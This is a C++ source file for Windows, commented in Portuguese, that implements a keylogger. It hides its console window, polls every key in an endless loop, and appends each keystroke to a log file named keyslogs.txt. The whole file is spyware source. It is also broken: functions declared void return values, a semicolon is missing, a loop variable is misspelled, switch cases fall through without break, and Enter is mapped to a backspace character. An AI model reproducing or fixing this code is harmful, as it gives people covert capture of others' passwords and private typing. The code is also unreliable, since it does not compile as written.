#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>

// Caminho do arquivo de log
#define LOG_FILE "keyslogs.txt"

// Salvar dados em arquivo de log
void SaveData(std::string data){
    std::fstream log_file;

    // Abrir o arquivo
    // std::ios::app fará o novo acréscimo ao arquivo em vez de apagar o conteúdo do arquivo
    // E depois escreve nele
    log_file.open(LOG_FILE, std::ios::app);

    // Grava dados no arquivo de log
    log_file << data;

    // Fecha o fluxo do arquivo
    log_file.close();
    return 0;
}

// Converte teclas especiais int para string
void converteTeclasEspeciais(int key){
    std::string resultado;

    switch(key){
    case VK_SPACE:
        // Tecla de espaço
        resultado = " ";
        break;
    case VK_RETURN:
        // Tecla de nova linha
        resultado = "\b";
        break;
    case VK_CAPITAL:
        // Tecla CAPSLOCK
        resultado = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        // Tecla Shift
        resultado = "[SHIFT]";
    case VK_TAB:
        // Tecla TAB
        resultado = "[TAB]";
    case VK_CONTROL:
        // Tecla Control
        resultado = "[CTRL]";
    case VK_MENU:
        // Tecla ALT
        resultado = "[ALT]";
    default:
        break;
    }

    return resultado;
}


int main(){

    // Declara as teclas especiais
    int special_keys[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_MENU, VK_CAPITAL}
    std::string special_keychar;
    bool isSpecialKey;
    // Esconde o terminal do Windows
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Loop infinito
    while(1){
        // Loop para percorrer cada tecla da tebela ASCII
        for(int key = 8; key <= 190; ke++){
            // Checa se a tecla é pressionada
            if(GetAsyncKeyState(key) == -32767){
                // Tecla pressionada
                // Checa se tecla é uma tecla especial
                isSpecialKey = std::find(std::begin(special_keys), std::end(special_keys), key) != std::end(special_keys);
                if(isSpecialKey){
                    // Esta é uma tecla especial. precisamos traduzir
                    special_keychar = converteTeclasEspeciais(key);
                    SaveData(special_keychar);
                } else {
                    // Esta não uma tecla especial. precisamos verificar se é maiuscula ou minuscula
                    if(GetKeyState(VK_CAPITAL)){
                        // CAPSLOCK Ativado
                        SaveData(std::string(1, (char)key));
                    } else{
                        // CPASLOCK Desativado
                        // Transforme o caractere em minúsculo antes de salvar
                        SaveData(std::string(1, (char)std::tolower(key)));
                    }
               }
            }
        }
    }
    return 0;
}
